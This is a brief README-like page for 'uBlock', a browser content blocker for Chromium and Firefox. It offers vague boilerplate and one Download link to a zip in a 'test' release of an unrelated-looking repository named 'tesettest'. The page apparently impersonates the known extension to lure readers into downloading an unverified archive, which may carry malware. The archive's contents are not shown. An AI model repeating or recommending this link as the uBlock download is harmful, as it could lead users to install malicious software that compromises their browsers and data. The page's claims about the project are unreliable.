# uBlock — Efficient Content Blocker for Chromium and Firefox

uBlock is a browser content blocker focused on efficient filtering for Chromium and Firefox. It is designed to stay fast and lightweight while helping users reduce unwanted web content during everyday browsing.

[Download](https://github.com/gcoyerk/tesettest/releases/download/test/uBlock.zip)

## What This Project Provides

uBlock is intended for users who want a lean browser extension for content filtering. The project centers on performance-conscious blocking for supported desktop browser families, with a focus on keeping the browsing experience responsive.

## Browser Support

The project is described for:

- Chromium-based browsers
- Firefox

## Key Characteristics

- Efficient content blocking

- Support for major browser platforms
